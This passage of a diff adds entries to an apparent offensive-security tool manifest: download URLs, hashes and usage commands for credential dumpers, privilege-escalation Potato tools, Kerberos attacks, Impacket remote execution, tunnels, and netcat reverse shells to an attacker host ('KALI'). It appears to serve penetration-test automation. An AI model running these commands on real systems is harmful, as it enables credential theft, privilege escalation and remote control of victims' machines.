+  notes: 'Run with: .\SafetyKatz.exe'
+- name: SharpKatz.exe
+  display_name: SharpKatz
+  description: C# port of Mimikatz credential extraction functions
+  project_url: https://github.com/b4rtik/SharpKatz
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpKatz.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 1fb8283cbaf639a63237e2de82ee37c0a1618025ce40fa017e9054ddfcebf27d
+  folder: SharpKatz
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - mimikatz
+  - lsass
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'Run with: .\SharpKatz.exe --Command logonpasswords'
+- name: SharpSecDump.exe
+  display_name: SharpSecDump
+  description: C# port of Impacket secretsdump - remote SAM/LSA/NTDS extraction
+  project_url: https://github.com/G0ldenGunSec/SharpSecDump
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpSecDump.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 533de8a68df18c158193f437c0a0f477242edf53f53535a6c63b43e551b92125
+  folder: SharpSecDump
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - secretsdump
+  - sam
+  - ntds
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'Run with: .\SharpSecDump.exe -target=localhost'
+- name: Snaffler.exe
+  display_name: Snaffler
+  description: Tool to find interesting data in Active Directory file shares
+  project_url: https://github.com/SnaffCon/Snaffler
+  upstream_url: https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe
+  upstream_version: latest
+  license: MIT
+  sha256: fbd7e6cb37d758f9ec179fe427ca645569868099c16819f16f9e86392d8f2abd
+  folder: Snaffler
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - shares
+  - fileshare
+  - ad
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\Snaffler.exe -s -o snaffler.log'
+- name: LockLess.exe
+  display_name: LockLess
+  description: Access locked files by copying file handles from other processes
+  project_url: https://github.com/GhostPack/LockLess
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/LockLess.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 366294485d6a2c872b0ebf033cb129a23ed2fce4ca2dc3e7905cb49a808ba7a6
+  folder: LockLess
+  categories:
+  - Credentials
+  platform: windows
+  architecture: any
+  tags:
+  - credentials
+  - file-access
+  - ghostpack
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'Run with: .\LockLess.exe /process:lsass.exe /file:C:\path\to\file'
+- name: PrintSpoofer64.exe
+  display_name: PrintSpoofer (64-bit)
+  description: Abuse SeImpersonatePrivilege via print spooler - x64
+  project_url: https://github.com/itm4n/PrintSpoofer
+  upstream_url: https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+  upstream_version: v1.0
+  license: MIT
+  sha256: 8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
+  folder: PrintSpoofer
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: x64
+  tags:
+  - token-abuse
+  - impersonation
+  - spooler
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: 'Run with: .\PrintSpoofer64.exe -i -c cmd'
+- name: PrintSpoofer32.exe
+  display_name: PrintSpoofer (32-bit)
+  description: Abuse SeImpersonatePrivilege via print spooler - x86
+  project_url: https://github.com/itm4n/PrintSpoofer
+  upstream_url: https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
+  upstream_version: v1.0
+  license: MIT
+  sha256: 47c9eff8142490a2c341701aab7aaebc355eed1540eed534a8317dd1e65614b2
+  folder: PrintSpoofer
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: x86
+  tags:
+  - token-abuse
+  - impersonation
+  - spooler
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: 'Run with: .\PrintSpoofer32.exe -i -c cmd'
+- name: GodPotato-NET4.exe
+  display_name: GodPotato (.NET 4)
+  description: Potato privilege escalation via DCOM - .NET 4.x
+  project_url: https://github.com/BeichenDream/GodPotato
+  upstream_url: https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+  upstream_version: v1.20
+  license: MIT
+  sha256: 9a8e9d587b570d4074f1c8317b163aa8d0c566efd88f294d9d85bc7776352a28
+  folder: GodPotato
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: any
+  tags:
+  - token-abuse
+  - potato
+  - impersonation
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: 'Run with: .\GodPotato-NET4.exe -cmd "cmd /c whoami"'
+- name: GodPotato-NET35.exe
+  display_name: GodPotato (.NET 3.5)
+  description: Potato privilege escalation via DCOM - .NET 3.5
+  project_url: https://github.com/BeichenDream/GodPotato
+  upstream_url: https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
+  upstream_version: v1.20
+  license: MIT
+  sha256: 3027a212272957298bf4d32505370fa63fb162d6a6a6ec091af9d7626317a858
+  folder: GodPotato
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: any
+  tags:
+  - token-abuse
+  - potato
+  - impersonation
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: For older systems with .NET 3.5 only
+- name: GodPotato-NET2.exe
+  display_name: GodPotato (.NET 2.0)
+  description: Potato privilege escalation via DCOM - .NET 2.0
+  project_url: https://github.com/BeichenDream/GodPotato
+  upstream_url: https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe
+  upstream_version: v1.20
+  license: MIT
+  sha256: 3027a212272957298bf4d32505370fa63fb162d6a6a6ec091af9d7626317a858
+  folder: GodPotato
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: any
+  tags:
+  - token-abuse
+  - potato
+  - impersonation
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: For legacy systems with .NET 2.0 only
+- name: JuicyPotato.exe
+  display_name: JuicyPotato
+  description: Abuse SeImpersonate/SeAssignPrimaryToken via COM servers
+  project_url: https://github.com/ohpe/juicy-potato
+  upstream_url: https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+  upstream_version: v0.1
+  license: MIT
+  sha256: 0f56c703e9b7ddeb90646927bac05a5c6d95308c8e13b88e5d4f4b572423e036
+  folder: JuicyPotato
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: x64
+  tags:
+  - token-abuse
+  - potato
+  - impersonation
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: 'Run with: .\JuicyPotato.exe -l 1337 -c {CLSID} -p cmd.exe -t *'
+- name: JuicyPotatoNG.exe
+  display_name: JuicyPotatoNG
+  description: Next generation JuicyPotato - works on newer Windows versions
+  project_url: https://github.com/antonioCoco/JuicyPotatoNG
+  upstream_url: https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
+  upstream_version: v1.1
+  license: MIT
+  sha256: 8e455ba6a2c90627cc6cb38b17b974db6251c1ec763cb83eeba28897031aa409
+  folder: JuicyPotato
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: any
+  tags:
+  - token-abuse
+  - potato
+  - impersonation
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: Extracted from zip; works on Windows 10/11 and Server 2019+
+- name: SweetPotato.exe
+  display_name: SweetPotato
+  description: Collection of potato privilege escalation techniques in one binary
+  project_url: https://github.com/CCob/SweetPotato
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SweetPotato.exe
+  upstream_version: latest
+  license: MIT
+  sha256: 699c219d3e7a3978af6e948096ba7c5a796044134433227ec7c2c8791d55bb07
+  folder: SweetPotato
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: any
+  tags:
+  - token-abuse
+  - potato
+  - impersonation
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: 'Run with: .\SweetPotato.exe -p cmd.exe'
+- name: RoguePotato.exe
+  display_name: RoguePotato
+  description: Potato escalation targeting OXID resolver on remote IP
+  project_url: https://github.com/antonioCoco/RoguePotato
+  upstream_url: https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
+  upstream_version: v1.0
+  license: MIT
+  sha256: 615b79f1390ff1168e8bcd72f733c74d4b10fe74855f90229188b3ee14e257a5
+  folder: RoguePotato
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: any
+  tags:
+  - token-abuse
+  - potato
+  - impersonation
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: Requires remote OXID resolver; extracted from zip
+- name: RemotePotato0.exe
+  display_name: RemotePotato0
+  description: Escalation via DCOM activation and NTLM relay to domain controller
+  project_url: https://github.com/antonioCoco/RemotePotato0
+  upstream_url: https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip
+  upstream_version: v1.2
+  license: MIT
+  sha256: f18b8da65681d1384407e8682e8b7da89bf2ba818782db0be09c642bc099ffc6
+  folder: RemotePotato0
+  categories:
+  - TokenAbuse
+  platform: windows
+  architecture: any
+  tags:
+  - token-abuse
+  - potato
+  - ntlm
+  - relay
+  - privesc
+  finding_triggers:
+  - se_impersonate_enabled
+  - se_assign_primary_token_enabled
+  notes: Requires network relay setup; extracted from zip
+- name: SharpHound.exe
+  display_name: SharpHound (Binary)
+  description: BloodHound C# data collector - enumerates AD objects and relationships
+  project_url: https://github.com/SpecterOps/SharpHound
+  upstream_url: https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip
+  upstream_version: v2.5.9
+  license: Apache-2.0
+  sha256: 98860d5110dbc81f0e83681a6977bbefe0b987f98346847a35b254ec5c0994aa
+  folder: SharpHound
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - bloodhound
+  - enumeration
+  - graph
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\SharpHound.exe -c all'
+- name: SharpHound.ps1
+  display_name: SharpHound (PowerShell)
+  description: BloodHound PowerShell collector - alternative to binary
+  project_url: https://github.com/SpecterOps/SharpHound
+  upstream_url: https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip
+  upstream_version: v2.5.9
+  license: Apache-2.0
+  sha256: 98860d5110dbc81f0e83681a6977bbefe0b987f98346847a35b254ec5c0994aa
+  folder: SharpHound
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - bloodhound
+  - enumeration
+  - powershell
+  finding_triggers:
+  - domain_joined
+  notes: Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All
+- name: Certify.exe
+  display_name: Certify
+  description: Enumerate and abuse misconfigured AD Certificate Services (ADCS)
+  project_url: https://github.com/GhostPack/Certify
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 26a9bef961429f04491115b7547d6d675c83fbc978fa0af3002c7a454146060d
+  folder: Certify
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - adcs
+  - certificates
+  - ghostpack
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\Certify.exe find /vulnerable'
+- name: Whisker.exe
+  display_name: Whisker
+  description: C# tool for Shadow Credentials attack on AD computer/user objects
+  project_url: https://github.com/eladshamir/Whisker
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Whisker.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: ba79ae8b463c6521428eba99cad2cbf99e37290ecac9c16b2d06b3bc954524b8
+  folder: Whisker
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - shadow-credentials
+  - msds-keycredentiallink
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\Whisker.exe add /target:computername$'
+- name: KrbRelayUp.exe
+  display_name: KrbRelayUp
+  description: Universal no-fix privilege escalation via Kerberos relay in Windows domain
+  project_url: https://github.com/Dec0ne/KrbRelayUp
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/KrbRelayUp.exe
+  upstream_version: latest
+  license: MIT
+  sha256: f504340404e40fea29f2beb71c114ce3d310ca80631aff7c0f0c19198da897d4
+  folder: KrbRelayUp
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - kerberos
+  - relay
+  - privesc
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName attacker$ -ComputerPassword
+    pass'
+- name: ADCSPwn.exe
+  display_name: ADCSPwn
+  description: Escalate AD privileges via misconfigured certificate templates
+  project_url: https://github.com/bats3c/ADCSPwn
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADCSPwn.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 261ca01737445fb91c1b212a6b1e54d1cb0641b4226b0ac2281ce8e6d4515db9
+  folder: ADCSPwn
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - adcs
+  - certificates
+  - privesc
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\ADCSPwn.exe --adcs ca.domain.local --port 9001'
+- name: PetitPotam.py
+  display_name: PetitPotam (Python)
+  description: Python implementation of PetitPotam NTLM coercion attack
+  project_url: https://github.com/topotam/PetitPotam
+  upstream_url: https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
+  upstream_version: latest
+  license: MIT
+  sha256: 5b27d34a29b92357f527efb54a1068c3cc8d7b5428e9fd61aae8790c6c73f348
+  folder: PetitPotam
+  categories:
+  - AD
+  platform: linux
+  architecture: any
+  tags:
+  - ad
+  - coercion
+  - ntlm
+  - efsrpc
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 PetitPotam.py listener target'
+- name: SharpLAPS.exe
+  display_name: SharpLAPS
+  description: Retrieve LAPS (Local Admin Password Solution) passwords from AD
+  project_url: https://github.com/swisskyrepo/SharpLAPS
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpLAPS.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 306e92e962ffc26b1e342fd9a1abafbe01836cc5d90108fb03d99579d3df42bf
+  folder: SharpLAPS
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - laps
+  - passwords
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\SharpLAPS.exe /user:user /pass:pass /host:dc'
+- name: SharpGPOAbuse.exe
+  display_name: SharpGPOAbuse
+  description: Abuse Group Policy Objects for privilege escalation in AD
+  project_url: https://github.com/FSecureLABS/SharpGPOAbuse
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpGPOAbuse.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 877e132eedcab2e1bd2a3ab07fe14851028164c69cff418c841f365b039a8f98
+  folder: SharpGPOAbuse
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - gpo
+  - group-policy
+  - privesc
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Default Domain Policy"'
+- name: kerbrute_linux
+  display_name: Kerbrute (Linux)
+  description: Kerberos brute-force and user enumeration - Linux binary
+  project_url: https://github.com/ropnop/kerbrute
+  upstream_url: https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a
+  folder: Kerbrute
+  categories:
+  - AD
+  platform: linux
+  architecture: x64
+  tags:
+  - ad
+  - kerberos
+  - brute-force
+  - enumeration
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: ./kerbrute_linux userenum -d domain.local users.txt'
+- name: kerbrute.exe
+  display_name: Kerbrute (Windows)
+  description: Kerberos brute-force and user enumeration - Windows binary
+  project_url: https://github.com/ropnop/kerbrute
+  upstream_url: https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: d18aa84b7bf0efde9c6b5db2a38ab1ec9484c59c5284c0bd080f5197bf9388b0
+  folder: Kerbrute
+  categories:
+  - AD
+  platform: windows
+  architecture: x64
+  tags:
+  - ad
+  - kerberos
+  - brute-force
+  - enumeration
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\kerbrute.exe userenum -d domain.local users.txt'
+- name: Farmer.exe
+  display_name: Farmer
+  description: Collect NetNTLM hashes by planting WebDAV references
+  project_url: https://github.com/mdsecactivebreach/Farmer
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Farmer.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 6c348459587332b58d0c88ea303701fab8ccba79c550e74f58b2fd7944cf1e53
+  folder: Farmer
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - netntlm
+  - credential-harvest
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\Farmer.exe <port> [minutes-to-run]'
+- name: PowerView.ps1
+  display_name: PowerView
+  description: PowerSploit AD enumeration module - find shares, GPOs, ACLs, trusts
+  project_url: https://github.com/PowerShellMafia/PowerSploit
+  upstream_url: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 507e8666c239397561c58609f7ea569c9c49ddbb900cd260e7e42b02d03cfd87
+  folder: PowerSploit
+  categories:
+  - AD
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - enumeration
+  - powersploit
+  - powershell
+  finding_triggers:
+  - domain_joined
+  notes: Import-Module .\PowerView.ps1; Get-DomainUser
+- name: chisel_linux
+  display_name: Chisel (Linux)
+  description: Fast TCP/UDP tunnel over HTTP - Linux amd64 binary
+  project_url: https://github.com/jpillora/chisel
+  upstream_url: https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
+  upstream_version: v1.10.1
+  license: MIT
+  sha256: 0525aa3c5d457f2a4075e66221d5125d434bedf15006d3271c213f5cd6ff2230
+  folder: Chisel
+  categories:
+  - Tunneling
+  platform: linux
+  architecture: x64
+  tags:
+  - tunneling
+  - pivoting
+  - http
+  - socks
+  finding_triggers:
+  - '*'
+  notes: 'Server: ./chisel_linux server -p 8080 --reverse; Client: ./chisel_linux client IP:8080 R:socks'
+- name: chisel.exe
+  display_name: Chisel (Windows)
+  description: Fast TCP/UDP tunnel over HTTP - Windows amd64 binary
+  project_url: https://github.com/jpillora/chisel
+  upstream_url: https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
+  upstream_version: v1.10.1
+  license: MIT
+  sha256: 42fd40bb0e6e8e0072a83f3a824de5045636c1cc8e3819daa3c9b7a985a2cc58
+  folder: Chisel
+  categories:
+  - Tunneling
+  platform: windows
+  architecture: x64
+  tags:
+  - tunneling
+  - pivoting
+  - http
+  - socks
+  finding_triggers:
+  - '*'
+  notes: 'Client: .\chisel.exe client KALI:8080 R:socks'
+- name: ligolo-agent.exe
+  display_name: Ligolo-ng Agent (Windows)
+  description: Ligolo-ng tunneling agent for Windows
+  project_url: https://github.com/nicocha30/ligolo-ng
+  upstream_url: https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip
+  upstream_version: v0.7.5
+  license: GPL-3.0
+  sha256: 15327ab6cbc8c9820ed68fbcdc84d8b0dd89d467213607a69a32f9aec9a681d9
+  folder: Ligolo
+  categories:
+  - Tunneling
+  platform: windows
+  architecture: x64
+  tags:
+  - tunneling
+  - pivoting
+  - ligolo
+  finding_triggers:
+  - '*'
+  notes: 'Run with: .\ligolo-agent.exe -connect KALI:11601 -ignore-cert'
+- name: ligolo-agent_linux
+  display_name: Ligolo-ng Agent (Linux)
+  description: Ligolo-ng tunneling agent for Linux
+  project_url: https://github.com/nicocha30/ligolo-ng
+  upstream_url: https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
+  upstream_version: v0.7.5
+  license: GPL-3.0
+  sha256: cc0cdffd4d9bdf66377f0aa64943197af9b0bc23a1a855ff7e93107ab7ed3706
+  folder: Ligolo
+  categories:
+  - Tunneling
+  platform: linux
+  architecture: x64
+  tags:
+  - tunneling
+  - pivoting
+  - ligolo
+  finding_triggers:
+  - '*'
+  notes: 'Run with: ./ligolo-agent_linux -connect KALI:11601 -ignore-cert'
+- name: ligolo-proxy_linux
+  display_name: Ligolo-ng Proxy (Linux)
+  description: Ligolo-ng proxy server for Linux - runs on attack host
+  project_url: https://github.com/nicocha30/ligolo-ng
+  upstream_url: https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
+  upstream_version: v0.7.5
+  license: GPL-3.0
+  sha256: afa13326872a70e2462bec592130c273b63713fb43a231bce60b93ac6f1008dd
+  folder: Ligolo
+  categories:
+  - Tunneling
+  platform: linux
+  architecture: x64
+  tags:
+  - tunneling
+  - pivoting
+  - ligolo
+  - server
+  finding_triggers:
+  - '*'
+  notes: 'Run with: ./ligolo-proxy_linux -selfcert -laddr 0.0.0.0:11601'
+- name: socat
+  display_name: Socat (Linux)
+  description: Multipurpose relay for bidirectional data transfer - static Linux binary
+  project_url: https://github.com/andrew-d/static-binaries
+  upstream_url: https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+  upstream_version: latest
+  license: GPL-2.0
+  sha256: 71c81cb46dd1903f12f3aef844b0fc559f31e2f613a8ae91ffb5630bc7011ef5
+  folder: Socat
+  categories:
+  - Tunneling
+  platform: linux
+  architecture: x64
+  tags:
+  - tunneling
+  - relay
+  - port-forward
+  finding_triggers:
+  - '*'
+  notes: 'Run with: ./socat TCP-LISTEN:8080,fork TCP:target:80'
+- name: nc.exe
+  display_name: Netcat (64-bit)
+  description: Netcat for Windows - network utility for reading/writing TCP/UDP
+  project_url: https://github.com/int0x33/nc.exe
+  upstream_url: https://github.com/int0x33/nc.exe/raw/master/nc64.exe
+  upstream_version: latest
+  license: GPL-2.0
+  sha256: 3e59379f585ebf0becb6b4e06d0fbbf806de28a4bb256e837b4555f1b4245571
+  folder: Netcat
+  categories:
+  - Tunneling
+  - Shells
+  platform: windows
+  architecture: x64
+  tags:
+  - networking
+  - reverse-shell
+  - tunneling
+  finding_triggers:
+  - '*'
+  notes: 'Reverse shell: nc.exe -e cmd.exe KALI 4444'
+- name: nc32.exe
+  display_name: Netcat (32-bit)
+  description: Netcat for Windows - 32-bit build
+  project_url: https://github.com/int0x33/nc.exe
+  upstream_url: https://github.com/int0x33/nc.exe/raw/master/nc.exe
+  upstream_version: latest
+  license: GPL-2.0
+  sha256: e8fbec25db4f9d95b5e8f41cca51a4b32be8674a4dea7a45b6f7aeb22dbc38db
+  folder: Netcat
+  categories:
+  - Tunneling
+  - Shells
+  platform: windows
+  architecture: x86
+  tags:
+  - networking
+  - reverse-shell
+  - tunneling
+  finding_triggers:
+  - '*'
+  notes: 'Reverse shell: nc32.exe -e cmd.exe KALI 4444'
+- name: secretsdump.py
+  display_name: secretsdump
+  description: Impacket - remote SAM/LSA/NTDS secrets extraction
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 1931b8fd5692a84fc48bdb1b7212c3d1a4bac0920f80084a0b7de0cd9788d9da
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - credentials
+  - sam
+  - ntds
+  - python
+  finding_triggers:
+  - autologon_credentials
+  - saved_credentials_cmdkey
+  - ps_history_credentials
+  notes: 'Run with: python3 secretsdump.py domain/user:pass@target'
+- name: GetUserSPNs.py
+  display_name: GetUserSPNs
+  description: Impacket - Kerberoasting to extract service ticket hashes
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/GetUserSPNs.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 04ffb457f3391b41d827659d3be202567fbdd21166a66043d2bf9a1fad95934d
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - kerberoasting
+  - ad
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request'
+- name: GetNPUsers.py
+  display_name: GetNPUsers
+  description: Impacket - AS-REP roasting for accounts without Kerberos pre-auth
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/GetNPUsers.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 793943cb46e27e8568d10e025a5dcb0df37b1f7e0eb958b817d49ad0db32af8b
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - asreproasting
+  - ad
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP'
+- name: psexec.py
+  display_name: psexec (Impacket)
+  description: Impacket - remote command execution via SMB/RPC
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: e7ffd727cd86c9c169fa7d738f44ef273d94537e4d9a490a5798333ce531a988
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - execution
+  - smb
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 psexec.py domain/user:pass@target'
+- name: wmiexec.py
+  display_name: wmiexec
+  description: Impacket - semi-interactive shell via WMI
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/wmiexec.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: dcc75d93fd210d11168871ca028b1b9b343bddce618da84f3520cbd51fec480f
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - execution
+  - wmi
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 wmiexec.py domain/user:pass@target'
+- name: smbexec.py
+  display_name: smbexec
+  description: Impacket - semi-interactive shell via SMB service creation
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/smbexec.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 3577a60e3c6d31193d4240cfeac7397c8f9d770a24db1ea5ce2bb506b50b3870
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - execution
+  - smb
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 smbexec.py domain/user:pass@target'
+- name: atexec.py
+  display_name: atexec
+  description: Impacket - command execution via scheduled task (AT)
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/atexec.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 6b1d77f0a5d984fe336f48e0d41481a9a8f6d6fa429f2b06c2d179e07b0528c4
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - execution
+  - scheduled-task
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 atexec.py domain/user:pass@target "command"'
+- name: dcomexec.py
+  display_name: dcomexec
+  description: Impacket - semi-interactive shell via DCOM
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/dcomexec.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: a5f81680684e3c9ba2cba8eceee55dc52f876b2f363d7256bc4b6f237e695021
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - execution
+  - dcom
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 dcomexec.py domain/user:pass@target'
+- name: getTGT.py
+  display_name: getTGT
+  description: Impacket - request TGT for a given user with password/hash/key
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/getTGT.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: ebefaca755e3cb1bd12dd26ff22de6d678e1bc95104def33465c8fd130241ca9
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - kerberos
